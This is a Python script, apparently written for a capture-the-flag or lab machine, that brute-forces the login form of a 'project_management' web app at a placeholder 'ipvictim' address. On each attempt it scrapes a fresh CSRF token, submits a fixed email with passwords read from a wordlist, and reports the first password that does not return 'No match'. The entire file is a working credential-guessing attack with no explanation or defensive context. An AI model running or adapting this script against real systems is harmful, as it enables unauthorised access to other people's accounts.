import requests
import signal
import sys
import time
import re
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
login_url = "http://ipvictim/project_management/index.php/login"

def makeBruteForce():
    f = open("passwd.txt", "r")
    p1 = log.progress("Brute Force")
    p1.status("Starting Brute Force Attack")
    time.sleep(2)
    counter = 1
    for passwd in f.readlines():
        passwd = passwd.strip()
        p1.status("Trying Password [%d/148]: %s" % (counter, passwd))
        s = requests.session()
        r = s.get(login_url)
        token = re.findall(r'_csrf_token*]" value="(.*?)"', r.text)[0]
        data_post = {
            'login[_csrf_token]': token,
            'login[email]': 'ch33s3m4n@cheeseyjack.local',
            'login[password]': passwd,
            'http_referer': 'http://ipvictim/project_management/'
        }
        r = s.post(login_url, data=data_post)
        if "No match" not in r.text:
            p1.success("The password is %s" % passwd)
            sys.exit(0)
        counter += 1

if __name__ == '__main__':
    makeBruteForce()
